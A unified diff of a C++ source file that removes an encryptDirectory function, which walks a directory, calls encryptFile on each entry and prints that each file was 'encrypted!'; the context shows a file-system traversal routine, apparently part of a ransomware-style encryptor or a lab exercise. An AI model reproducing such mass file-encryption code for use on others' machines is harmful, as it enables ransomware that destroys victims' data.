@@ -46,33 +46,6 @@ void encryptFile(string fileName) {
 	remove(tempFileName.c_str());
 }
 
-//function read directory and call encrypt file
-void encryptDirectory(string directoryName) {
-	DIR* directory;
-	struct dirent* directoryItem;
-	string fileName;
-	string currentDirectory = directoryName + "/.";
-	string parentDirectory = directoryName + "/..";
-
-	//check if I can open dir
-	//c_str will convert from string to const char
-	//because opendir() is a c func but directoryName is C++ string
-	if ((directory = opendir(directoryName.c_str())) != NULL) {
-		//directory is opened
-		//now read each file
-		while ((directoryItem = readdir(directory)) != NULL) {
-			//got access to the file
-			fileName = directoryName + "/" + directoryItem->d_name;
-			//check if item is currentDir or parentdir
-			if ((fileName != currentDirectory) && (fileName != parentDirectory)) {
-				//call enc
-				encryptFile(fileName);
-				cout << fileName << " encrypted!" << endl;
-			}
-		}
-	}
-}
-
 //go through the file system
 void files_tree(const char* folder) {
 
